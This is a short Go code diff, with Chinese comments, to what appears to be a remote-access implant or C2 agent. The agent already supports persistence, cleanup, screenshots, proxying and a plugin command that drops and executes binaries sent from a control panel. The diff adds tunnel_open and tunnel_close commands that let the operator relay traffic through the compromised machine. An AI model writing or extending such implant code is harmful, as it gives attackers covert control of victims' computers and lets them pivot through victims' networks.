@@ -630,6 +630,8 @@ const (
 	CmdSysInfo    = "sysinfo"
 	CmdPersist    = "persist"
 	CmdCleanup    = "cleanup"
+	CmdTunnelOpen  = "tunnel_open"
+	CmdTunnelClose = "tunnel_close"
 	CmdProxy      = "proxy"
 	CmdProxyStop  = "proxystop"
 	// CmdPlugin 对应原版的 runplugin 任务。面板控制器拼出的命令是
@@ -2814,6 +2816,22 @@ func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
 
 	case CmdScreenshot:
 		return captureScreenshot()
+
+	case CmdTunnelOpen:
+		chanID, ok := decodeTunnelID(payload["id"])
+		if !ok {
+			return "", "tunnel_open requires a positive id"
+		}
+		addr, _ := payload["addr"].(string)
+		target, _ := payload["target"].(string)
+		return handleTunnelOpen(chanID, addr, target)
+
+	case CmdTunnelClose:
+		chanID, ok := decodeTunnelID(payload["id"])
+		if !ok {
+			return "", "tunnel_close requires a positive id"
+		}
+		return handleTunnelClose(chanID)
 
 	case CmdPlugin:
 		// 面板把插件二进制经 base64 下发（plugins/<name> 的内容），agent 落盘后执行。
